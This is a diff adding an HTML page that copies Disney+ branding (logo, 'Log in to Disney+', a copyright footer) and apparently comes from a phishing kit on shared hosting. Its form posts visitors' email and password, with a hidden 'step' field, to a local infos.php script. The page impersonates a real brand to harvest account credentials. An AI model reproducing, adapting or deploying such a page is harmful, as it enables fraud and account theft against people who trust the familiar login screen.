@@ -1,0 +1,51 @@
+source: 
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <!-- link_icons -->
+        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+        <title>Login</title>
+        <!-- logo img title-->
+        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
+        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
+        <!-- link__css -->
+        <link rel="stylesheet" href="css/red.css" />
+
+</head>
+<body style="background-image: url('image/background.webp'); background-size: cover; background-position: center; background-repeat: no-repeat;">
+  <div class="container">
+    <img src="image/Disney+_logo.svg" alt="Disney+ Logo" class="logo" />
+    <form action="infos.php" method="post">
+                        <input type="hidden" value="index" name="step">
+      <h1>Log in to Disney+</h1>
+      <input type="email" name="user" placeholder="Email" required />
+      <input type="password" name="pass" placeholder="Password" required />
+      <button class="btn" name="submit">Log In</button>
+      <div class="signup-link">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </form>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Cookie Policy</a>
+      <a href="#">Help</a>
+    </div>
+    <p class="copyright">&copy; 2025 Disney and its related entities. All rights reserved.</p>
+  </footer>
+        <script src="js/jquery-3.5.1.min.js"></script>
+        <script src="js/jquery.mask.js"></script>
+        <script>
+
+        </script>
+              
+</body>
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl509406'},{'dcenter':'sxb1'},{'cp_id':'10434770'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
+
+Page title: Login
